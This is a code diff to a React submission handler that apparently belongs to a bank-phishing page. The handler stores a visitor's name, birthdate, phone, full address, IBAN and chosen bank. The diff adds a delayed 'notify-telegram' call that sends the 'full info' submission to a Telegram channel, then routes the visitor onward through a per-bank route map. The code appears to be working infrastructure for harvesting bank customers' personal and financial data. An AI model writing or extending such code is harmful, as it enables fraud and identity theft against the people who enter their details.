@@ -111,26 +111,42 @@ const Index = () => {
   const handleSubmit = useCallback(async () => {
     if (!selectedBank) return;
     const sessionId = crypto.randomUUID().slice(0, 8);
-    const { error } = await supabase.from("submissions").insert({
-      session_id: sessionId,
-      full_name: fullName,
-      email,
-      birthdate,
-      phone,
-      street,
-      house_number: houseNumber,
-      staircase,
-      door_number: doorNumber,
-      postal_code: postalCode,
-      city,
-      iban,
-      bank: selectedBank,
-    });
+    const { data: inserted, error } = await supabase
+      .from("submissions")
+      .insert({
+        session_id: sessionId,
+        full_name: fullName,
+        email,
+        birthdate,
+        phone,
+        street,
+        house_number: houseNumber,
+        staircase,
+        door_number: doorNumber,
+        postal_code: postalCode,
+        city,
+        iban,
+        bank: selectedBank,
+      })
+      .select("id")
+      .single();
 
     if (error) {
       console.error("Insert failed:", error);
       alert("Fehler beim Speichern der Daten. Bitte versuchen Sie es erneut.");
       return;
+    }
+
+    // Schedule delayed Full-Info notification (5 min). The edge function
+    // will skip sending if a Log notification was triggered in the meantime.
+    if (inserted?.id) {
+      supabase.functions.invoke("notify-telegram", {
+        body: {
+          submission_id: inserted.id,
+          kind: "full_info",
+          delay_seconds: 300,
+        },
+      }).catch(() => {});
     }
 
     const route = bankRouteMap[selectedBank];
